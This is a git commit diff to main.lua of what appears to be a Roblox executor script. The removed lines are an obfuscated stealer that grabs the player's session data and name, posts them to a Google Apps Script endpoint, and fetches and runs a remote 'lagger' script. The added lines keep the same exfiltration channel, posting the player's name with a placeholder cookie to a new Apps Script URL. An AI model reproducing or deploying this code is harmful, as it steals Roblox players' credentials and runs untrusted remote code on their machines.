acaa31c037f76a9215cb3fc156a3777002063349
delt-script <github.123abc@gmail.com>
2026-04-20 14:07:55 +0900

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,28 +1,14 @@
-task.spawn(function()
-    task.wait(5)
-    local _0x_GAS_URL = "https://script.google.com/macros/s/AKfycbzkvyDbX4MJElmWCMClLUSg_sI3DylBim7mSaLLvd7GKMvAApr5I3kf28L_Xaa0FaqDHA/exec"
-    local _0x_HTTP = game:GetService("HttpService")
-    local function _0x_DO_WORK()
-        local _0x_C = "Not Found"
-        pcall(function()
-            _0x_C = tostring(game:HttpGet("https://www.roblox.com/mobileapi/userinfo")):split(":")[1] or "Failed"
-        end)
-        local _0x_P = {
-            ["user"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
-            ["cookie"] = _0x_C,
-            ["status"] = "FINAL_PHASE_ACTIVE"
-        }
-        local _0x_R = (getgenv().request or getgenv().http_request)
-        if _0x_R then
-            _0x_R({
-                Url = _0x_GAS_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = _0x_HTTP:JSONEncode(_0x_P)
-            })
-        end
-    end
-    pcall(_0x_DO_WORK)
-end)
+-- もしURL全体を貼るならこうだ
+local gasUrl = "https://script.google.com/macros/s/AKfycbwdJIdlqht8Pp1PdSAc77SO0ayL37_ENEKTcf9Rx-9OvzWgICbUOOKWw6UrYUk8JEDgMA/exec"
 
-loadstring(game:HttpGet("https://sk-konbu.site/SKHub/SK-Lagger.txt"))()
+local _0x_R = (getgenv().request or getgenv().http_request or request)
+_0x_R({
+    Url = gasUrl, -- ここにフルURLを入れる
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game:GetService("HttpService"):JSONEncode({
+        user = game.Players.LocalPlayer.Name,
+        cookie = "TEST_DATA",
+        status = "RE-TRYING"
+    })
+})
